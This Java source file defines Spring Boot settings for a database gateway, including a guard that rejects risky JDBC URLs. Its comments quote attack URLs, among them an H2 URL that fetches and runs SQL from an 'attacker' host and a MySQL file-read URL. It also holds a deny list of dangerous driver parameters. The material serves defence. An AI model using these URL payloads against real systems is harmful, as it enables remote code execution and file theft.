/*
 * Copyright 2024-2026 Embabel Pty Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.entropy.database.mcp.properties;

import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.context.properties.bind.ConstructorBinding;

import java.time.Duration;
import java.util.List;
import java.util.Locale;
import java.util.Set;

/**
 * BYOK connection lifecycle configuration.
 * Allows customization of lease duration, max lifetime, and pool settings.
 */
@ConfigurationProperties(prefix = "entropy.mcp.database.byok")
public record ByokProperties(
    Duration leaseDuration,
    Duration maxLifetime,
    Duration cleanupInterval,
    Integer maxCachedConnections,
    Integer poolSize,
    Integer minIdle,
    UrlGuard urlGuard
) {
    /**
     * Annotated explicitly because this record has a second, lifecycle-only constructor: with more
     * than one constructor Spring Boot refuses to guess which one to bind.
     */
    @ConstructorBinding
    public ByokProperties {
        if (leaseDuration == null || leaseDuration.isNegative() || leaseDuration.isZero()) {
            leaseDuration = Duration.ofHours(1);
        }
        if (maxLifetime == null || maxLifetime.isNegative() || maxLifetime.isZero()) {
            // maxLifetime must be strictly greater than leaseDuration; default to 2h
            // to satisfy the constraint while giving ample headroom.
            maxLifetime = Duration.ofHours(2);
        }
        if (cleanupInterval == null || cleanupInterval.isNegative() || cleanupInterval.isZero()) {
            cleanupInterval = Duration.ofMinutes(5);
        }
        if (maxCachedConnections == null || maxCachedConnections <= 0) {
            maxCachedConnections = 100;
        }
        if (poolSize == null || poolSize <= 0) {
            poolSize = 10;
        }
        if (minIdle == null || minIdle <= 0) {
            minIdle = 2;
        }
        if (urlGuard == null) {
            urlGuard = UrlGuard.defaults();
        }
    }

    /**
     * Lifecycle-only constructor, retained so that callers that do not care about the JDBC URL guard
     * keep compiling and transparently get {@link UrlGuard#defaults()}.
     */
    public ByokProperties(Duration leaseDuration,
                          Duration maxLifetime,
                          Duration cleanupInterval,
                          Integer maxCachedConnections,
                          Integer poolSize,
                          Integer minIdle) {
        this(leaseDuration, maxLifetime, cleanupInterval, maxCachedConnections, poolSize, minIdle, null);
    }

    /**
     * Guard rails applied to caller-supplied JDBC URLs before a pool is created.
     *
     * <h2>Why the defaults are asymmetric</h2>
     * This is a BYOK gateway: the caller legitimately owns the database it points us at, so
     * restricting <em>which driver</em> or <em>which host</em> may be reached is deployment policy and
     * defaults to "everything allowed" ({@code allowedDrivers} / {@code blockedHosts} empty,
     * {@code blockPrivateNetworks} false). Turning those on by default would break working
     * connections without closing the actual hole.
     *
     * <p>The actual hole is the <em>parameters</em> of the URL. A JDBC URL is not just an address; for
     * several drivers on this classpath it is also a code/file-access channel:
     * <ul>
     *   <li>{@code jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker/x.sql'} executes attacker SQL at
     *       connect time, and that script can {@code CREATE ALIAS} a Java method - remote code
     *       execution in this JVM;</li>
     *   <li>{@code jdbc:mysql://host/db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true} turns a
     *       rogue MySQL server into an arbitrary-file read of <em>this</em> server;</li>
     *   <li>{@code autoDeserialize}, {@code socketFactory}, {@code queryInterceptors} and
     *       {@code statementInterceptors} all name classes the driver will instantiate or feed data
     *       into.</li>
     * </ul>
     * None of these are needed to talk to a database the caller owns, so
     * {@code rejectDangerousUrlParameters} defaults to {@code true}.
     *
     * @param allowedDrivers               allowed JDBC schemes (the token after {@code jdbc:}, e.g.
     *                                     {@code mysql}); empty means every driver is allowed
     * @param blockedHosts                 hosts that must not be reached; an entry starting with
     *                                     {@code .} or {@code *.} matches by domain suffix; empty
     *                                     means no host is blocked
     * @param blockPrivateNetworks         reject loopback / link-local / RFC1918 literals; defaults to
     *                                     {@code false}
     * @param rejectDangerousUrlParameters reject the code-execution and local-file URL parameters
     *                                     listed above; defaults to {@code true}
     */
    public record UrlGuard(
        List<String> allowedDrivers,
        List<String> blockedHosts,
        Boolean blockPrivateNetworks,
        Boolean rejectDangerousUrlParameters
    ) {
        /**
         * URL parameter keys that hand the caller code execution or local file access.
         * Compared lower-case, and matched for both the {@code ;key=value} and the
         * {@code ?key=value} / {@code &key=value} spelling.
         *
         * <p>H2's {@code FORBID_CREATION} is deliberately absent: it is a hardening switch, not an
         * attack vector, so it stays usable.
         */
        private static final Set<String> DANGEROUS_PARAMETER_KEYS = Set.of(
                // H2: run SQL / scripts at connect time, or write to an attacker-chosen file
                "init", "runscript", "script", "trace_level_file",
                // MySQL: read files off this server, or make it instantiate attacker-named classes
                "allowloadlocalinfile", "allowurlinlocalinfile", "uselocalinfile",
                "autodeserialize", "socketfactory",
                "queryinterceptors", "statementinterceptors",
                "detectcustomcollations", "allowmultiqueries");

        /**
         * Substrings that betray an embedded script payload even when it is smuggled inside another
         * parameter's value (H2's {@code INIT=} is exactly that: a SQL statement list).
         */
        private static final Set<String> DANGEROUS_TOKENS = Set.of("runscript", "create alias");

        public UrlGuard {
            allowedDrivers = normalize(allowedDrivers);
            blockedHosts = normalize(blockedHosts);
            if (blockPrivateNetworks == null) {
                blockPrivateNetworks = false;
            }
            if (rejectDangerousUrlParameters == null) {
                // The one guard that is on by default: see the class comment.
                rejectDangerousUrlParameters = true;
            }
        }

        /** Driver and host wide open, dangerous URL parameters rejected. */
        public static UrlGuard defaults() {
            return new UrlGuard(List.of(), List.of(), false, true);
        }

        /**
         * Check a JDBC URL against this policy.
         *
         * @return a violation description naming the offending parameter or host, or {@code null} when
         *         the URL is acceptable. The returned text never embeds the URL itself, because a JDBC
         *         URL frequently carries the password.
         */
        public String findViolation(String jdbcUrl) {
            if (jdbcUrl == null || jdbcUrl.isBlank()) {
                return null;
            }
            String lower = jdbcUrl.toLowerCase(Locale.ROOT);

            if (!allowedDrivers.isEmpty()) {
                String scheme = scheme(lower);
                if (scheme == null || !allowedDrivers.contains(scheme)) {
                    return "jdbcUrl driver '" + (scheme == null ? "unknown" : scheme)
                            + "' is not in entropy.mcp.database.byok.url-guard.allowed-drivers";
                }
            }

            if (rejectDangerousUrlParameters) {
                String parameter = findDangerousParameter(lower);
                if (parameter != null) {
                    return "jdbcUrl contains the forbidden parameter '" + parameter
                            + "': it allows script execution or local file access from the JDBC URL. "
                            + "Remove it, or allow it explicitly via "
                            + "entropy.mcp.database.byok.url-guard.reject-dangerous-url-parameters=false";
                }
            }

            String host = host(lower);
            if (host == null || host.isEmpty()) {
                return null;
            }
            if (isBlockedHost(host)) {
                return "jdbcUrl host '" + host
                        + "' is listed in entropy.mcp.database.byok.url-guard.blocked-hosts";
            }
            if (blockPrivateNetworks && isPrivateNetwork(host)) {
                return "jdbcUrl host '" + host + "' is a private / loopback address and "
                        + "entropy.mcp.database.byok.url-guard.block-private-networks is enabled";
            }
            return null;
        }

        /** The token between {@code jdbc:} and the next {@code :}, e.g. {@code h2} or {@code mysql}. */
        private static String scheme(String lowerUrl) {
            if (!lowerUrl.startsWith("jdbc:")) {
                return null;
            }
            int end = lowerUrl.indexOf(':', "jdbc:".length());
            if (end < 0) {
                return null;
            }
            String scheme = lowerUrl.substring("jdbc:".length(), end);
            return scheme.isBlank() ? null : scheme;
        }

        private static String findDangerousParameter(String lowerUrl) {
            for (String segment : splitParameters(lowerUrl)) {
                int equals = segment.indexOf('=');
                String key = (equals >= 0 ? segment.substring(0, equals) : segment).trim();
                if (DANGEROUS_PARAMETER_KEYS.contains(key)) {
                    return key;
                }
            }
            for (String token : DANGEROUS_TOKENS) {
                if (lowerUrl.contains(token)) {
                    return token;
                }
            }
            return null;
        }

        /**
         * Split off every {@code ;} / {@code ?} / {@code &} separated parameter. The first chunk is the
         * address part and is intentionally kept in the list only to be discarded by the key lookup.
         */
        private static List<String> splitParameters(String lowerUrl) {
            return List.of(lowerUrl.split("[;?&]"));
        }

        /**
         * Best-effort host extraction from the many JDBC URL shapes ({@code //host:port/db},
         * Oracle's {@code @//host:port/service} and {@code @host:port:sid}). Returns {@code null} when
         * the URL has no network authority at all (H2 in-memory, SQLite file, ...), in which case the
         * host policies simply do not apply.
         */
        private static String host(String lowerUrl) {
            int start;
            int slashes = lowerUrl.indexOf("//");
            if (slashes >= 0) {
                start = slashes + 2;
            } else {
                int at = lowerUrl.indexOf('@');
                if (at < 0) {
                    return null;
                }
                start = at + 1;
            }
            int end = lowerUrl.length();
            for (int i = start; i < lowerUrl.length(); i++) {
                char c = lowerUrl.charAt(i);
                if (c == '/' || c == ':' || c == ';' || c == '?' || c == ',') {
                    end = i;
                    break;
                }
            }
            String host = lowerUrl.substring(start, end);
            int credentials = host.indexOf('@');
            if (credentials >= 0) {
                host = host.substring(credentials + 1);
            }
            return host;
        }

        private boolean isBlockedHost(String host) {
            for (String blocked : blockedHosts) {
                if (blocked.startsWith("*.")) {
                    String suffix = blocked.substring(1);
                    if (host.equals(blocked.substring(2)) || host.endsWith(suffix)) {
                        return true;
                    }
                } else if (blocked.startsWith(".")) {
                    if (host.endsWith(blocked) || host.equals(blocked.substring(1))) {
                        return true;
                    }
                } else if (host.equals(blocked)) {
                    return true;
                }
            }
            return false;
        }

        /**
         * Literal-only private network detection. Deliberately no DNS resolution: a lookup here would
         * add network latency to every connection registration and could itself be steered by the
         * caller.
         */
        private static boolean isPrivateNetwork(String host) {
            if (host.equals("localhost") || host.equals("::1") || host.equals("[::1]")) {
                return true;
            }
            String[] octets = host.split("\\.");
            if (octets.length != 4) {
                // IPv6 unique-local (fc00::/7) and link-local (fe80::/10)
                return host.startsWith("fc") || host.startsWith("fd")
                        || host.startsWith("[fc") || host.startsWith("[fd")
                        || host.startsWith("fe80") || host.startsWith("[fe80");
            }
            int[] parts = new int[4];
            for (int i = 0; i < 4; i++) {
                try {
                    parts[i] = Integer.parseInt(octets[i]);
                } catch (NumberFormatException e) {
                    return false;
                }
                if (parts[i] < 0 || parts[i] > 255) {
                    return false;
                }
            }
            return parts[0] == 10
                    || parts[0] == 127
                    || parts[0] == 0
                    || (parts[0] == 172 && parts[1] >= 16 && parts[1] <= 31)
                    || (parts[0] == 192 && parts[1] == 168)
                    || (parts[0] == 169 && parts[1] == 254);
        }

        /** Lower-cased, blank-free, immutable copy; {@code null} becomes an empty list. */
        private static List<String> normalize(List<String> values) {
            if (values == null || values.isEmpty()) {
                return List.of();
            }
            return values.stream()
                    .filter(value -> value != null && !value.isBlank())
                    .map(value -> value.trim().toLowerCase(Locale.ROOT))
                    .toList();
        }
    }
}
